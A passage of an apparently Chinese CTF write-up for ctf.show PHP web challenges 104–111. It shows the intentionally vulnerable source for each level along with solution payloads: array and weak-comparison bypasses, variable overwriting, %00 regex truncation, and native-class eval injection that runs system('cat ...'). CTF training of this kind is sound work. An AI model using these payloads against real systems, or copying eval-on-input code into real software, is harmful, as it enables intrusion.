</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span><span class="o">==</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>使v1=v2即可</p>
<pre tabindex="0"><code>v1=1
v2=1
</code></pre><h4 id="web105">web105<a hidden class="anchor" aria-hidden="true" href="#web105">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:34:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$error</span><span class="o">=</span><span class="s1">&#39;你还想要flag嘛？&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$suces</span><span class="o">=</span><span class="s1">&#39;既然你想要那给你吧！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$key</span><span class="o">===</span><span class="s1">&#39;error&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;what are you doing?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$$key</span><span class="o">=</span><span class="nv">$$value</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$value</span><span class="o">===</span><span class="s1">&#39;flag&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;what are you doing?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="nv">$$key</span><span class="o">=</span><span class="nv">$$value</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$flag</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nv">$error</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="k">echo</span> <span class="s2">&#34;your are good&#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="k">die</span><span class="p">(</span><span class="nv">$suces</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><ul>
<li>
<p>本题考查变量覆盖和<code>die()</code>的知识</p>
</li>
<li>
<p><code>$$a = $$b</code>可以类似于，将$a的地址指向$b</p>
<p>所以无论$b怎么改变值，$a的值都会和$b一样</p>
</li>
<li>
<p><code>die()</code>函数虽然会终止程序，但同时也会输出括号内的终止提示信息</p>
</li>
</ul>
<p>方法一：</p>
<p>本题利用变量覆盖和<code>die()</code>函数的特性</p>
<ol>
<li>先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=&gt;flag的地址</li>
<li>再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=&gt;flag的地址</li>
<li>此时无论进入哪个<code>die()</code>函数，都可以输出<code>$flag</code>的值</li>
</ol>
<p>payload:</p>
<pre tabindex="0"><code>Get: suces=flag
POST: error=suces
</code></pre><p>方法二：</p>
<pre tabindex="0"><code>Get: ?suces=flag&amp;flag=
</code></pre><p>先将flag的值赋给suces，再将flag的值赋为空，从而通过判断，输出suces的值</p>
<h4 id="web106">web106<a hidden class="anchor" aria-hidden="true" href="#web106">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:38:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span><span class="o">==</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$v1</span><span class="o">!=</span><span class="nv">$v2</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>我们使用数组绕过即可</p>
<pre tabindex="0"><code>v1[]=1
v2[]=0
</code></pre><h4 id="web107">web107<a hidden class="anchor" aria-hidden="true" href="#web107">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 23:24:14
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">       <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$v2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">       <span class="k">if</span><span class="p">(</span><span class="nv">$v2</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">           <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>parse_str函数:它用于将字符串解析为变量，如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 arr 则会设置到该数组里 ）。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">   <span class="c1">//parse_str()将查询的字符串解析到变量中
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span>   <span class="nx">parse_str</span><span class="p">(</span><span class="s2">&#34;name=Gopal K Verma&amp;age=45&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">   
</span></span><span class="line"><span class="ln">5</span><span class="cl">   <span class="k">echo</span> <span class="nv">$name</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">   <span class="k">echo</span> <span class="nv">$age</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>其实实际上就是md5弱比较</p>
<p>方法一：随便给一个值给flag，将MD5转换后的值赋给v3</p>
<pre tabindex="0"><code>v3=1
v1=flag=c4ca4238a0b923820dcc509a6f75849b
</code></pre><p>方法二:数组绕过</p>
<pre tabindex="0"><code>v3[]=1
v1=&#34;flag[]=1&#34;
</code></pre><h4 id="web108">web108<a hidden class="anchor" aria-hidden="true" href="#web108">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 23:53:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">ereg</span> <span class="p">(</span><span class="s2">&#34;^[a-zA-Z]+$&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span><span class="o">===</span><span class="k">FALSE</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="c1">//只有36d的人才能看到flag
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span><span class="o">==</span><span class="mh">0x36d</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>题目给出的0x36d为16进制数，十进制为877，需要字母开头或结尾的话为877a，因为是==弱比较，可以等同于877，逆序后为a778,直接读取不行，需要加一个截断%00来绕过正则的判断。</p>
<p>payload</p>
<pre tabindex="0"><code>GET:?c=a%00778
</code></pre><h4 id="web109">web109<a hidden class="anchor" aria-hidden="true" href="#web109">#</a></h4>
<p>考点:php原生类利用</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-29 22:02:34
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$v1</span><span class="s2">(</span><span class="si">$v2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>关于php原生类的利用</p>
<p><a href="https://blog.csdn.net/weixin_54902210/article/details/124689580">https://blog.csdn.net/weixin_54902210/article/details/124689580</a></p>
<p>payload:</p>
<pre tabindex="0"><code>v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;) 
or
v1=Reflectionclass&amp;v2=system(&#39;cat fl36dg.txt&#39;)
</code></pre><p>其他的原生类也行，比如Error</p>
<h4 id="web110">web110<a hidden class="anchor" aria-hidden="true" href="#web110">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-29 22:49:10
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$v1</span><span class="s2">(</span><span class="si">$v2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>依旧是对php原生类的利用</p>
<p>但是增加了对v1和v2的过滤，但是它没有过滤字母，考虑用纯字母构造payload</p>
<p>类<code>FilesystemIterator</code>可以用来遍历目录，需要一个路径参数</p>
<p>函数<code>getcwd</code>可以返回当前工作路径且不需要参数，由此可以构造payload</p>
<pre tabindex="0"><code>https://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator&amp;v2=getcwd
</code></pre><p><img alt="image-20250105235948415" loading="lazy" src="assets/image-20250105235948415.png"></p>
<p>得到flag的位置,直接访问即可</p>
<h4 id="web111">web111<a hidden class="anchor" aria-hidden="true" href="#web111">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 02:41:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$v1</span><span class="p">,</span><span class="o">&amp;</span><span class="nv">$v2</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;$</span><span class="si">$v1</span><span class="s2"> = &amp;$</span><span class="si">$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
